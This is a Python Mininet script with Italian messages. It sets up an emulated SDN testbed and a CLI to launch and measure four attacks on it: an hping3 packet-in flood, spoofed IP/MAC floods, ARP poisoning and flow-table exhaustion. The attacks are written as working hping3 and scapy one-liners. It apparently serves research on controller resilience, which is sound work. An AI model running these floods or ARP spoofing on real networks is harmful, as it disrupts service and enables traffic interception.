#!/usr/bin/env python3
from mininet.net import Mininet
from mininet.node import RemoteController, OVSKernelSwitch
from mininet.cli import CLI
from mininet.link import TCLink
from mininet.log import setLogLevel, info

ATTACKS = {
    '1': ("Packet-In Flood",
          "hping3 --flood --rand-dest 10.0.0.254 -I h1-eth0 &"),
    '2': ("Spoofed IP/MAC Flood",
          "python3 -c \"from scapy.all import *; "
          "sendp(Ether(src=RandMAC(), dst='00:00:00:00:00:02')/"
          "IP(src=RandIP('10.0.0.0/24'), dst='10.0.0.2')/ICMP(), "
          "iface='h1-eth0', loop=1, inter=0, verbose=False)\" "
          "> /tmp/attack2.log 2>&1 &"),
    '3': ("ARP Poisoning / Storm",
          "python3 -c \"from scapy.all import *; "
          "sendp(Ether(dst='00:00:00:00:00:03')/"
          "ARP(op=2, psrc='10.0.0.2', hwsrc='00:00:00:00:00:01', "
          "pdst='10.0.0.3', hwdst='00:00:00:00:00:03'), "
          "iface='h1-eth0', loop=1, inter=1, verbose=False)\" "
          "> /tmp/arp_storm.log 2>&1 &"),
    '4': ("TCAM Flow Table Exhaustion",
          "python3 -c \"from scapy.all import *; "
          "sendp(Ether(src=RandMAC(), dst='00:00:00:00:00:02')/"
          "IP(src=RandIP('10.0.0.0/24'), dst='10.0.0.2')/TCP(dport=80), "
          "iface='h1-eth0', loop=1, inter=0, verbose=False)\" "
          "> /tmp/attack4.log 2>&1 &"),
}


class AttackCLI(CLI):

    def do_attack(self, line):
        key = line.strip()
        if key not in ATTACKS:
            print("Uso: attack <1-4>")
            for k, (name, _) in ATTACKS.items():
                print(f"  {k}: {name}")
            return
        for h in self.mn.hosts:
            h.cmd('pkill -9 hping3')
            h.cmd('pkill -9 -f scapy')
        name, cmd = ATTACKS[key]
        h1 = self.mn.get('h1')
        print(f"Lancio attacco {key}: {name}")
        print(h1.cmd(cmd))
        import time
        time.sleep(1)
        check = h1.cmd("ps aux | grep -E 'hping3|scapy' | grep -v grep")
        if check.strip():
            print("Processo attivo confermato:")
            print(check)
        else:
            print("ATTENZIONE: nessun processo di attacco trovato dopo il lancio.")
            print("Controlla eventuali errori sopra: l'attacco potrebbe non essere partito.")

    def do_stop(self, line):
        for h in self.mn.hosts:
            h.cmd('pkill -9 hping3')
            h.cmd('pkill -9 -f scapy')
        print("Tutti i processi di attacco sono stati fermati")

    def do_reset(self, line):
        s1 = self.mn.get('s1')
        s1.cmd('ovs-ofctl del-flows s1 -O OpenFlow13')
        print("Flow table dello switch svuotata")

    def do_flows(self, line):
        s1 = self.mn.get('s1')
        out = s1.cmd('ovs-ofctl dump-flows s1 -O OpenFlow13')
        print(out)
        print(f"Numero di flow attivi: {out.count(chr(10))}")

    def do_watchflows(self, line):
        seconds = int(line.strip()) if line.strip() else 20
        s1 = self.mn.get('s1')
        import time
        for i in range(seconds):
            out = s1.cmd('ovs-ofctl dump-flows s1 -O OpenFlow13')
            print(f"t={i}s  flow attivi: {out.count(chr(10))}")
            time.sleep(1)

    def do_ctrlcpu(self, line):
        h1 = self.mn.get('h1')
        print(h1.cmd("ps aux | grep ryu-manager | grep -v grep"))

    def do_arp(self, line):
        hostname = line.strip() or 'h3'
        h = self.mn.get(hostname)
        print(f"Tabella ARP di {hostname}:")
        print(h.cmd('ip neigh show'))

    def do_freshflow(self, line):
        hostname = line.strip() or 'h3'
        h = self.mn.get(hostname)
        s1 = self.mn.get('s1')
        mac = h.MAC()
        s1.cmd(f'ovs-ofctl del-flows s1 -O OpenFlow13 "eth_src={mac}"')
        s1.cmd(f'ovs-ofctl del-flows s1 -O OpenFlow13 "eth_dst={mac}"')
        print(f"Regole di {hostname} ({mac}) rimosse. "
              "Il resto della tabella resta intatto: il prossimo pacchetto "
              "di questo host dovrà necessariamente richiedere una regola nuova.")

    def do_run(self, line):
        args = line.split()
        if not args or args[0] not in ATTACKS:
            print("Uso: run <1-4> [durata_secondi] [outfile.csv]")
            for k, (name, _) in ATTACKS.items():
                print(f"  {k}: {name}")
            return
        key = args[0]
        duration = args[1] if len(args) > 1 else '30'
        outfile = args[2] if len(args) > 2 else f'attack{key}_log.csv'

        h1 = self.mn.get('h1')
        h3 = self.mn.get('h3')

        for h in self.mn.hosts:
            h.cmd('pkill -9 hping3')
            h.cmd('pkill -9 -f scapy')

        name, cmd = ATTACKS[key]
        print(f"Avvio attacco {key}: {name}")
        h1.cmd(cmd)

        import time
        time.sleep(1)
        check = h1.cmd("ps aux | grep -E 'hping3|scapy' | grep -v grep")
        if not check.strip():
            print("ATTENZIONE: l'attacco non risulta attivo, test interrotto.")
            return
        print("Attacco confermato attivo. Avvio monitor su h3 per "
              f"{duration}s...")

        print(h3.cmd(f"python3 monitor.py 10.0.0.2 {duration} {outfile}"))

        for h in self.mn.hosts:
            h.cmd('pkill -9 hping3')
            h.cmd('pkill -9 -f scapy')
        print(f"Test completato. Log salvato in {outfile}. "
              "Attacco fermato automaticamente.")

    def do_stress(self, line):
        args = line.split()
        if len(args) < 2 or args[0] not in ATTACKS:
            print("Uso: stress <1-4> <n_istanze> [durata_secondi] [outfile.csv]")
            for k, (name, _) in ATTACKS.items():
                print(f"  {k}: {name}")
            return
        key = args[0]
        n = int(args[1])
        duration = args[2] if len(args) > 2 else '30'
        outfile = args[3] if len(args) > 3 else f'attack{key}_x{n}_log.csv'

        h1 = self.mn.get('h1')
        h3 = self.mn.get('h3')

        for h in self.mn.hosts:
            h.cmd('pkill -9 hping3')
            h.cmd('pkill -9 -f scapy')

        name, cmd = ATTACKS[key]
        print(f"Avvio {n} istanze simultanee di attacco {key}: {name}")
        for i in range(n):
            h1.cmd(cmd)

        import time
        time.sleep(1)
        check = h1.cmd("ps aux | grep -E 'hping3|scapy' | grep -v grep")
        count = check.count('hping3') + check.count('scapy')
        print(f"Istanze attive confermate: {count}")
        print(check)
        if count < n:
            print(f"ATTENZIONE: attese {n} istanze, trovate solo {count}.")

        print(f"Avvio monitor su h3 per {duration}s...")
        print(h3.cmd(f"python3 monitor.py 10.0.0.2 {duration} {outfile}"))

        for h in self.mn.hosts:
            h.cmd('pkill -9 hping3')
            h.cmd('pkill -9 -f scapy')
        print(f"Test completato. Log salvato in {outfile}. "
              "Tutte le istanze fermate automaticamente.")


def build():
    net = Mininet(controller=RemoteController, switch=OVSKernelSwitch,
                   link=TCLink, autoSetMacs=True)

    info('*** Aggiunta controller\n')
    c0 = net.addController('c0', controller=RemoteController,
                            ip='127.0.0.1', port=6653)

    info('*** Aggiunta switch\n')
    s1 = net.addSwitch('s1', protocols='OpenFlow13')

    info('*** Aggiunta host\n')
    h1 = net.addHost('h1', ip='10.0.0.1/24')   # attaccante
    h2 = net.addHost('h2', ip='10.0.0.2/24')   # vittima
    h3 = net.addHost('h3', ip='10.0.0.3/24')   # osservatore innocente

    info('*** Creazione link\n')
    net.addLink(h1, s1, bw=100, delay='1ms')
    net.addLink(h2, s1, bw=100, delay='1ms')
    net.addLink(h3, s1, bw=100, delay='1ms')

    info('*** Avvio rete\n')
    net.build()
    c0.start()
    s1.start([c0])

    AttackCLI(net)
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    build()
